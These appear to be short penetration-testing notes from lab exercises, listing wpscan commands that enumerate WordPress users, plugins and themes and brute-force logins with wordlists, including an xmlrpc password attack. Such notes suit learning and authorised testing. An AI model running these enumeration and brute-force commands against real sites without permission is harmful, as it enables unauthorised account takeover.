Enumerate users:
```
wpscan --url http://10.50.10.52/secret/ -e u
```
OR
```
wpscan --url http://wordy --enumerate
```

Scan for exploitation, vulneranle plugins and enumerate usernames: 
```
wpscan --url http://dc-2 -evt -evp -eu
```

To run a bruteforce attach on the user "admin", run the following command: 
```
wpscan --url http://10.50.10.52/secret/ -U admin -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
-P => is the password list you want to use If something is found, it will look like this: 
[SUCCESS] - admin / admin

Try cracking the passwords using words from the website and the username we found:
```
wpscan --url http://dc-2 --passwords cewlpasswords.txt --usernames tom,jerry,admin
```

This command will enumerate the username and run the password cracker against the password list: 
```
wpscan --url http://10.50.10.66/ --password-attack xmlrpc -P /usr/share/wordlists/rockyou.txt
```
